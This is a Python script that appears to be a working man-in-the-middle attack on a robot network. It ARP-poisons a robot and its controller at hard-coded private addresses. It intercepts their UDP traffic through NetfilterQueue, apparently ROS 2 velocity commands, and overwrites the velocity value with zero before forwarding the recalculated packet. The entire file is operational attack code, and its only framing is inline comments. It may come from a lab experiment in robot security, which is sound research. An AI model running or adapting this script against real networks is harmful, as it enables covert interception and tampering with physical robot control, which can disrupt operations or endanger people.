from scapy.all import *
from netfilterqueue import NetfilterQueue
import threading
import time
import subprocess
import re
# --- NETFILTERQUEUE PACKET PROCESSING ---
import struct # Required for binary packing/unpacking

# --- SETTINGS ---
#robot_ip      = "10.3.141.194"
#controller_ip = "10.3.141.131"
robot_ip = "192.168.0.194"
controller_ip = "192.168.0.16"
interface     = "wlan0"
queue_number  = 1

# --- MAC RESOLUTION & ARP SPOOFING ---
def get_mac(ip):
    # 1. Ping more aggressively to populate the ARP cache
    print(f"[*] Pinging {ip} to populate ARP cache...")
    subprocess.run(["ping", "-c", "5", "-W", "2", ip],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # 2. Read the local ARP table
    try:
        with open("/proc/net/arp") as f:
            for line in f:
                fields = line.split()
                if len(fields) < 4:
                    continue
                if fields[0] == ip:
                    mac = fields[3]
                    # Skip genuinely empty entries
                    if mac != "00:00:00:00:00:00":
                        return mac
    except Exception as e:
        print(f"[!] Error reading ARP table: {e}")

    # 3. Fallback to arping if the table read fails
    print(f"[*] Trying arping for {ip}...")
    try:
        result = subprocess.run(
            ["arping", "-I", interface, "-c", "5", "-w", "5", ip],
            capture_output=True, text=True
        )
        match = re.search(r'\[([0-9a-f:]{17})\]', result.stdout, re.IGNORECASE)
        if match:
            return match.group(1).lower()
    except FileNotFoundError:
        print("[!] arping not found! Run: sudo apt install iputils-arping")
    except Exception as e:
        print(f"[!] Arping error: {e}")

    return None

def spoof(target_ip, host_ip, target_mac):
    # Wrap in Ethernet frame to guarantee Layer 2 delivery
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
    sendp(packet, iface=interface, verbose=False)

# This runs in the background so it doesn't block packet processing
def arp_poison_thread(robot_mac, controller_mac):
    print("[*] ARP Poisoning Thread Active...")
    while True:
        spoof(robot_ip, controller_ip, robot_mac)
        spoof(controller_ip, robot_ip, controller_mac)
        time.sleep(2) 


def process_packet(packet):
    scapy_pkt = IP(packet.get_payload())
    if scapy_pkt.haslayer(UDP) and scapy_pkt.haslayer(Raw):
        raw_data = scapy_pkt[Raw].load
        
        # 1. Find the "Data" submessage marker (0x15 0x05)
        # This usually precedes the actual Twist data
        marker = b'\x15\x05'
        marker_pos = raw_data.find(marker)
        
        if marker_pos != -1:
            # In a standard Twist message, the X velocity is usually 
            # 28 bytes after the start of the 15 05 submessage header
            target_offset = marker_pos + 28 
            
            if len(raw_data) >= target_offset + 8:
                # Unpack and check
                current_vel = struct.unpack('<d', raw_data[target_offset:target_offset+8])[0]
                
                # Only overwrite if it looks like a real velocity (e.g., between -10 and 10)
                if 0.01 < abs(current_vel) < 10.0:
                    print(f"[*] Found Velocity {current_vel} at offset {target_offset}. Injecting 0.0!")
                    
                    malicious_bytes = struct.pack('<d', 0.0)
                    new_payload = raw_data[:target_offset] + malicious_bytes + raw_data[target_offset+8:]
                    
                    # Update packet and recalculate checksums
                    scapy_pkt[Raw].load = new_payload
                    del scapy_pkt[IP].len
                    del scapy_pkt[IP].chksum
                    del scapy_pkt[UDP].len
                    del scapy_pkt[UDP].chksum
                    packet.set_payload(bytes(scapy_pkt))

    packet.accept()


# --- STARTUP LOGIC ---
if __name__ == "__main__":
    print("[*] Python Interceptor Initializing...")
    
    robot_mac = get_mac(robot_ip)
    controller_mac = get_mac(controller_ip)
    
    if not robot_mac or not controller_mac:
        print("[!] Failed to get MAC addresses. Check IPs and interface. Exiting.")
        exit(1)
        
    print(f"[*] Target 1 (Robot):      {robot_ip} @ {robot_mac}")
    print(f"[*] Target 2 (Controller): {controller_ip} @ {controller_mac}")
    
    # Start ARP Spoofing in the background
    arp_thread = threading.Thread(target=arp_poison_thread, args=(robot_mac, controller_mac), daemon=True)
    arp_thread.start()
    
    # Bind the NetfilterQueue to the main thread
    nfqueue = NetfilterQueue()
    nfqueue.bind(queue_number, process_packet)
    
    print(f"\n[*] Waiting for packets on Queue #{queue_number}... (Press Ctrl+C to stop)")
    try:
        nfqueue.run() 
    except KeyboardInterrupt:
        print("\n[*] Python script shutting down...")
        nfqueue.unbind()
        # The bash wrapper handles the final iptables flush